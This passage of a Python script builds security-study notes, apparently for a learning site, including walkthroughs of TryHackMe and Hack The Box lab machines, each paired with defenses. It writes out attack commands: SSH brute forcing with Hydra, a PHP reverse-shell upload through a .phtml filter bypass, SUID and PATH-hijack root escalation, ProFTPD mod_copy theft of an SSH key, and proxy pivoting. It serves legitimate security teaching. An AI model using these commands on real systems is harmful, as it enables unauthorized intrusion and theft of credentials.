L o g i n :   a d m i n
P a s s w o r d :   S e c r e t 1 2 3 !
```

### In hands-on testing: HTB Meow
In Hack The Box's introductory machine **Meow**, an Nmap scan reveals port 23 open:
```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

Connecting to the service:
```bash
telnet <target_ip> 23
```
The server displays a login prompt. By testing default system usernames (`admin`, `administrator`, `root`), the attacker discovers that the `root` user has no password configured. The prompt immediately drops into an unprivileged root shell (`root@meow:~#`).

### How to defend against it
1. **Never use Telnet on modern networks**: There is no valid use case for plaintext Telnet in production systems.
2. **Decommission the service**:
   ```bash
   sudo systemctl stop telnetd
   sudo systemctl disable telnetd
   ```
3. **Migrate to SSH**: Standardize all remote shell access on SSH, which encrypts session data and prevents packet-sniffing attacks."""
    },
    {
        "slug": "dns",
        "title": "DNS (Domain Name System)",
        "symbol": "Dn",
        "category": "Network",
        "readTime": 2,
        "tldr": "The internet's phone book running on port 53; misconfigured zone transfers expose internal network topology.",
        "red": "Perform DNS zone transfers (AXFR) to dump all registered subdomains, IP ranges, and internal hostnames.",
        "blue": "Restrict AXFR zone transfers to authorized secondary nameservers only and monitor DNS queries.",
        "next": "proxychains",
        "content": """### What is DNS?
The Domain Name System (DNS) operates on port 53 (using UDP for standard queries and TCP for large responses and zone transfers). It translates human-readable domain names (like `target.local`) into machine-routable IP addresses.

During the reconnaissance phase of a security assessment, DNS enumeration reveals internal subdomains, mail servers, staging environments, and administrative panels.

### Core DNS record types
- **A**: Maps a domain name to an IPv4 address.
- **AAAA**: Maps a domain name to an IPv6 address.
- **MX**: Identifies mail exchange servers.
- **TXT**: Holds verification tokens, SPF, and DMARC email security records.
- **NS**: Identifies authoritative nameservers for the zone.

### The AXFR Zone Transfer vulnerability
In large networks, primary nameservers replicate their complete record database to secondary nameservers using an **AXFR (Asynchronous Full Transfer Zone)** operation.

If the administrator fails to restrict who can request a zone transfer, any external client can ask the nameserver to dump its entire database:

```bash
dig axfr @<target_ip> target.local
```

If the transfer succeeds, the nameserver responds with every single record:
```
target.local.       IN SOA  ns1.target.local.
mail.target.local.  IN A    10.0.2.15
dev.target.local.   IN A    10.0.2.22
vpn.target.local.   IN A    10.0.2.50
admin.target.local. IN A    10.0.2.99
```
In one command, the attacker discovers the organization's private development server, VPN gateway, and internal admin portal.

### How to defend against it
1. **Restrict zone transfers**: In BIND configuration (`named.conf`), explicitly restrict zone transfers to known secondary IP addresses:
   ```ini
   allow-transfer { 10.0.1.5; };
   ```
2. **Audit external records**: Ensure development or staging subdomains are not published in public DNS zones."""
    },
    {
        "slug": "proxychains",
        "title": "Proxychains & Traffic Pivoting",
        "symbol": "Px",
        "category": "Network",
        "readTime": 2,
        "tldr": "Chaining SOCKS proxies to route tool traffic through compromised hosts and reach isolated internal subnets.",
        "red": "Route Nmap or browser traffic through compromised jump hosts to attack hidden internal networks.",
        "blue": "Segment internal networks with strict firewalls and monitor unexpected outbound SOCKS or SSH tunnels.",
        "next": "basic-pentesting",
        "content": """### What is Proxychains?
Proxychains is a UNIX tool that forces any TCP connection initiated by a given program to route through a chain of user-configured SOCKS4, SOCKS5, or HTTP proxies. It uses dynamic hook injection (`LD_PRELOAD`) to intercept socket calls from tools that do not natively support proxying.

In penetration testing and red-teaming, proxychains is essential for **network pivoting**—using a compromised edge host to attack internal machines that cannot be reached directly from the attacker's machine.

### How it works in practice
Imagine you compromise a dual-homed web server with two network interfaces:
- Interface 1: `192.168.1.10` (Public / External).
- Interface 2: `10.0.2.1` (Private internal LAN).

From your attack machine, you cannot directly ping `10.0.2.15`. To bypass this, you set up an SSH dynamic port forward on your machine:

```bash
# Create local SOCKS proxy on port 1080 via compromised host
ssh -D 1080 -N user@192.168.1.10
```

Next, configure `/etc/proxychains.conf`:
```ini
[ProxyList]
# Route traffic through local SOCKS proxy
socks5 127.0.0.1 1080
```

Now prepend `proxychains` to any command. The tool connects through the compromised host:
```bash
proxychains nmap -sT -Pn -p 80,445 10.0.2.15
```
Or launch an internal browser session:
```bash
proxychains firefox http://10.0.2.15:8080
```

### Modes of Proxychains
- **Dynamic Chain**: Tries proxies in order. If one fails, it skips to the next without failing the entire connection.
- **Strict Chain**: All proxies in the list must be active and traversed in exact sequence.
- **Random Chain**: Chooses proxies randomly from the list to spread traffic across multiple egress points.

### How to defend against it
1. **Network micro-segmentation**: Do not let DMZ servers initiate connections into sensitive internal subnets.
2. **Detect SSH tunneling**: Monitor long-lived SSH connections from DMZ servers and inspect abnormal traffic volume."""
    },

    # MACHINES
    {
        "slug": "basic-pentesting",
        "title": "TryHackMe: Basic Pentesting",
        "symbol": "Bp",
        "category": "Machines",
        "readTime": 2,
        "tldr": "Enumerating exposed SMB shares to extract usernames, cracking weak credentials, and pivoting via SSH.",
        "red": "Enumerate SMB shares to leak valid usernames, brute-force weak SSH passwords, and inspect user directories.",
        "blue": "Require authentication on all SMB shares, enforce strong passwords, and protect private user keys.",
        "next": "rootme",
        "content": """### Machine Overview
Basic Pentesting on TryHackMe is an introductory Linux target designed to teach the fundamentals of service enumeration, credential brute-forcing, and multi-service privilege pivoting.

### Step 1: Service Enumeration
An initial Nmap scan reveals multiple listening ports:
```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

The web server on port 80 contains a standard welcome page without obvious flaws. Instead of getting stuck on the website, we shift focus to SMB (port 445).

### Step 2: SMB User Enumeration
Using `enum4linux` and `smbclient`, we query the open SMB shares without credentials:
```bash
enum4linux -a <target_ip>
```
The output reveals two valid usernames on the system: `jan` and `kay`.

### Step 3: Brute-Forcing SSH Access
With valid usernames confirmed and SSH open on port 22, we test for weak passwords using Hydra:
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
```
Within seconds, Hydra finds a weak password for user `jan`. We log into the system via SSH.

### Step 4: Privilege Escalation
In `/home/kay`, we find an encrypted RSA private key file (`id_rsa`). We transfer the key to our attack machine and use `ssh2john` to format it for password cracking with John the Ripper.

Once cracked, we authenticate as `kay`, inspect `sudo -l`, and discover full administrative privileges.

### Key takeaway
**Enumeration matters more than exploitation**. When web services appear barren, scanning adjacent services like SMB frequently reveals the critical credentials needed for initial access."""
    },
    {
        "slug": "rootme",
        "title": "TryHackMe: RootMe",
        "symbol": "Rm",
        "category": "Machines",
        "readTime": 2,
        "tldr": "Finding a hidden upload panel, bypassing extension filters with .phtml, and escalating to root via SUID python.",
        "red": "Fuzz web directories to find hidden panels, upload a PHP webshell using .phtml, and abuse SUID python for root.",
        "blue": "Restrict uploaded extensions on the server, disable script execution in upload paths, and audit SUID binaries.",
        "next": "kenobi",
        "content": """### Machine Overview
RootMe is a popular beginner CTF machine on TryHackMe focused on web enumeration, file upload filter bypasses, and Linux SUID privilege escalation.

### Step 1: Web Directory Fuzzing
An Nmap scan reveals two open ports:
- Port 22 (SSH)
- Port 80 (HTTP Apache 2.4.29)

Browsing to port 80 shows a simple landing page. To find hidden administrative routes, we run Gobuster:
```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```
Gobuster reveals two interesting directories:
- `/panel/`: A file upload page.
- `/uploads/`: The public directory where uploaded files are stored.

### Step 2: Bypassing the File Upload Filter
Attempting to upload a standard PHP reverse shell (`shell.php`) triggers an error: "PHP is not allowed".

The filter only checks the literal `.php` extension. By renaming the file to `.phtml` (an alternative extension that Apache executes as PHP):
```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml
```
The server accepts `shell.phtml`. We start a Netcat listener (`nc -lvnp 1234`) and navigate to `http://<target_ip>/uploads/shell.phtml`. The reverse shell connects back immediately as user `www-data`.

### Step 3: SUID Privilege Escalation
Once on the target machine, we search for binaries with the SUID bit enabled:
```bash
find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null
```
Among standard binaries, we find an unusual entry: `/usr/bin/python`.

Because Python runs with root permissions, we reference GTFOBins and execute:
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
The `-p` flag preserves root privileges, dropping directly into a root shell (`whoami` &rarr; `root`).

### Key takeaway
Never rely on client-side or blacklist-based extension checks. Furthermore, never grant SUID privileges to script interpreters or general-purpose binaries."""
    },
    {
        "slug": "kenobi",
        "title": "TryHackMe: Kenobi",
        "symbol": "Kn",
        "category": "Machines",
        "readTime": 2,
        "tldr": "Exploiting ProFTPD mod_copy to copy private SSH keys to an NFS share, then hijacking binary paths for root.",
        "red": "Use ProFTPD CPFR/CPTO to copy sensitive keys to an open NFS share, mount it, and hijack PATH in a SUID binary.",
        "blue": "Update vulnerable daemons, restrict NFS export permissions, and use absolute paths in custom compiled binaries.",
        "next": "meow",
        "content": """### Machine Overview
Kenobi on TryHackMe demonstrates how multiple seemingly minor service misconfigurations—an outdated FTP daemon, an open NFS share, and a path-hijackable SUID binary—can be chained together for full system takeover.

### Step 1: Reconnaissance
An Nmap scan reveals several active services:
- Port 21: ProFTPD 1.3.5
- Port 22: SSH
- Port 80: HTTP
- Port 111 / 2049: Network File System (NFS)
- Port 139 / 445: Samba

Using `showmount -e <target_ip>`, we see an accessible NFS export: `/var`.

### Step 2: Exploiting ProFTPD mod_copy
Searchsploit reveals that ProFTPD version 1.3.5 is vulnerable to unauthorized file copying via the `mod_copy` module (CVE-2015-3306). An unauthenticated client can issue `CPFR` (copy from) and `CPTO` (copy to) commands.

We connect to port 21 via Netcat and copy user Kenobi's private SSH key to the accessible `/var/tmp` directory:
```bash
nc <target_ip> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

### Step 3: Mounting NFS and Logging In
We mount the `/var` NFS share on our local attack machine:
```bash
sudo mount <target_ip>:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@<target_ip>
```
We obtain interactive shell access as `kenobi`.

### Step 4: SUID Path Hijacking
Searching for SUID binaries reveals an unusual custom binary: `/usr/bin/menu`.
Running `strings /usr/bin/menu` shows it executes system commands like `curl` without using an absolute path (`curl` instead of `/usr/bin/curl`).

We hijack the `PATH` environment variable:
```bash
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```
When `menu` runs `curl`, it executes our script instead, spawning a root shell.

### Key takeaway
Always use absolute paths when calling system utilities in custom SUID binaries."""
    },
    {
        "slug": "meow",
        "title": "Hack The Box: Meow",
        "symbol": "Me",
        "category": "Machines",
        "readTime": 2,
        "tldr": "Scanning for open ports, finding unencrypted Telnet, and logging in as root without a password.",
        "red": "Scan for port 23, connect with telnet, test default system usernames, and claim root without entering a password.",
        "blue": "Decommission Telnet, enforce SSH with key-based authentication, and ensure default accounts require passwords.",
        "next": "fawn",
        "content": """### Machine Overview
Meow is the introductory machine in Hack The Box's Starting Point Tier 0. It demonstrates basic network scanning and the danger of running unencrypted legacy protocols with blank administrative credentials.

### Step 1: Port Scanning
We begin with an Nmap scan to discover what services are listening:
```bash
nmap -sV <target_ip>
```
The scan identifies a single open port:
```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```
Port 23 runs Telnet—a legacy, unencrypted remote terminal protocol.

### Step 2: Testing Default Usernames
Because Telnet does not use key pairs or cryptographic handshakes, we connect directly using the Telnet client:
```bash
telnet <target_ip> 23
```
The server responds with an operational banner:
```
Meow login:
```

When approaching a system with an unknown password, penetration testers always test default administrative usernames:
- `admin`
- `administrator`
- `guest`
- `root`

We enter `root` at the prompt and press Enter.

### Step 3: Gaining Root Access
The system does not prompt for a password and immediately drops into a root shell:
```
Linux meow 5.4.0-77-generic #86-Ubuntu SMP
root@meow:~# whoami
root
```

We list files in the root directory:
```bash
ls -la
cat flag.txt
```
The flag is retrieved, and the machine is completed.

### Key takeaway
- **Default accounts must have strong passwords**: Never deploy systems with blank root passwords.
- **Telnet should never be exposed**: Plaintext protocols allow eavesdropping and lack modern brute-force protection."""
    },
    {
        "slug": "fawn",
        "title": "Hack The Box: Fawn",
        "symbol": "Fw",
        "category": "Machines",
        "readTime": 2,
        "tldr": "Discovering FTP on port 21, authenticating as anonymous with a blank password, and downloading files.",
        "red": "Connect to FTP port 21 as 'anonymous', list files, and download sensitive files using the 'get' command.",
        "blue": "Disable anonymous FTP authentication in vsftpd.conf and migrate to secure SFTP.",
        "next": "dancing",
        "content": """### Machine Overview
Fawn is the second target in Hack The Box's Starting Point series. It teaches the basics of FTP enumeration and demonstrates how anonymous access misconfigurations expose files.

### Step 1: Port Scanning
We scan the target using Nmap:
```bash
nmap -sV <target_ip>
```
Nmap identifies port 21 open:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
```
The daemon is `vsftpd 3.0.3` running on port 21.

### Step 2: Testing Anonymous Login
Many FTP servers are configured to permit public, unauthenticated access. We connect using the `ftp` command-line client:
```bash
ftp <target_ip>
Connected to <target_ip>.
220 (vsftpd 3.0.3)
Name (<target_ip>:kavy): anonymous
331 Please specify the password.
Password: <press Enter>
230 Login successful.
```
The server confirms `230 Login successful`. Anonymous login is enabled.

### Step 3: Extracting Files
Once connected to the FTP shell, we list available files:
```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

In an FTP shell, you cannot directly read a file using `cat`. You must download it to your local machine using `get`:
```bash
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
ftp> bye
```

On our local attack system, we inspect the downloaded file:
```bash
cat flag.txt
```
The challenge flag is displayed.

### Key takeaway
Anonymous FTP access should never be enabled on internal or production servers. If file transfers are required, mandate individual user authentication over encrypted SFTP."""
    },
    {
        "slug": "dancing",
        "title": "Hack The Box: Dancing",
        "symbol": "Da",
        "category": "Machines",
        "readTime": 2,
        "tldr": "Scanning SMB on port 445, listing network shares without passwords, and navigating remote file shares.",
        "red": "Use smbclient to enumerate open shares without credentials, browse directories, and download sensitive files.",
        "blue": "Enforce SMB authentication, require SMB packet signing, and audit share access permissions.",
        "next": "idor",
        "content": """### Machine Overview
Dancing is the third target in Hack The Box's Starting Point Tier 0. It introduces Server Message Block (SMB) file sharing on Windows and demonstrates how open shares leak sensitive information.

### Step 1: Port Scanning
An Nmap scan reveals standard Windows file-sharing ports:
```bash
nmap -sV <target_ip>
```
Output:
```
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds  Windows Server 2019
```
Port 445 (Microsoft-DS) indicates active SMB file sharing.

### Step 2: Listing SMB Shares
We use `smbclient` with the `-L` (list) and `-N` (no password) flags to check for accessible shares:
```bash
smbclient -L //<target_ip> -N
```
The server returns four shares:
- `ADMIN$`: Administrative share (Access denied).
- `C$`: Default drive root (Access denied).
- `IPC$`: Inter-Process Communication.
- `WorkShares`: Custom user share.

### Step 3: Connecting to the Unauthenticated Share
We connect directly to `WorkShares` without a password:
```bash
smbclient //<target_ip>/WorkShares -N
```
We receive an interactive SMB prompt:
```
smb: \\> ls
  .                                   D        0  Mon Mar 29 09:22:04 2021
  ..                                  D        0  Mon Mar 29 09:22:04 2021
  Amy.J                               D        0  Mon Mar 29 10:08:21 2021
  James.P                             D        0  Mon Mar 29 10:04:47 2021
```

We navigate into `James.P`:
```bash
smb: \\> cd James.P
smb: \\James.P\\> ls
  flag.txt                            A       32  Mon Mar 29 10:26:57 2021
smb: \\James.P\\> get flag.txt
getting file \\James.P\\flag.txt as flag.txt (32 bytes)
```

We exit the SMB client and read the downloaded flag:
```bash
cat flag.txt
```

### Key takeaway
Never allow anonymous or unauthenticated guest access to SMB shares. Enforce robust NTFS file permissions and require authenticated domain credentials for every share access."""
    }
]

out_dir = 'content/notes'
os.makedirs(out_dir, exist_ok=True)

for note in NOTES_DATA:
    filepath = os.path.join(out_dir, f"{note['slug']}.md")
    frontmatter = f"""---
title: "{note['title']}"
symbol: "{note['symbol']}"
category: "{note['category']}"
readTime: {note['readTime']}
tldr: "{note['tldr']}"
red: "{note['red']}"
blue: "{note['blue']}"
next: "{note['next']}"
---

{note['content'].strip()}
"""
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(frontmatter)
    print(f"Created: {filepath} ({note['symbol']} - {note['title']})")

print(f"\nSuccessfully generated {len(NOTES_DATA)} individual note files in {out_dir}/!")
